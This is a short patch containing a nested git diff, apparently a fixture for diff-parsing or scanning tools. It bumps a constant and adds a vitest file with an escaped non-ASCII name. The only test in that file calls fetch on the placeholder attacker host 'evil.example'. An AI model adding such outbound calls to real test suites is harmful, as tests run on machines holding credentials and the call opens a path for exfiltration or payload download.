@@ -1,0 +1,15 @@
+diff --git a/src/x.ts b/src/x.ts
+index 25dfdc4..fe01c7d 100644
+--- a/src/x.ts
++++ b/src/x.ts
+@@ -1 +1 @@
+-export const x = 2;
++export const x = 3;
+diff --git "a/test/\303\251.test.ts" "b/test/\303\251.test.ts"
+new file mode 100644
+index 0000000..79f1445
+--- /dev/null
++++ "b/test/\303\251.test.ts"
+@@ -0,0 +1,2 @@
++import { it } from 'vitest';
++it('t', async () => { await fetch('https://evil.example/t'); });
